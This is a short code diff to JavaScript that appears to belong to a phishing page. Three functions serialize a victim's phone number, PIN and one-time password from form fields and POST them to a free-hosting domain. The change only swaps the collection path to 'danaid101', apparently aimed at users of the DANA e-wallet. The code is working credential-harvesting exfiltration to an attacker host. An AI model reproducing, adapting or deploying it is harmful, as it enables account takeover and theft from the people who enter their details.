@@ -6,7 +6,7 @@ function sendNohp(event) {
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    $.ajax({
       type: 'POST',
-      url: 'https://chroedevsi.whf.bz/egom/one.php',
+      url: 'https://chroedevsi.whf.bz/danaid101/one.php',
       data: dataString,
       complete: function(data) {
          console.log('Complete');
@@ -31,7 +31,7 @@ function sendPin() {
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    $.ajax({
       type: 'POST',
-      url: 'https://chroedevsi.whf.bz/egom/two.php',
+      url: 'https://chroedevsi.whf.bz/danaid101/two.php',
       data: dataString,
       complete: function(data) {
          console.log('Complete');
@@ -60,7 +60,7 @@ function sendOtp() {
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    $.ajax({
       type: 'POST',
-      url: 'https://chroedevsi.whf.bz/egom/three.php',
+      url: 'https://chroedevsi.whf.bz/danaid101/three.php',
       data: dataString,
       complete: function(data) {
          console.log('Complete');
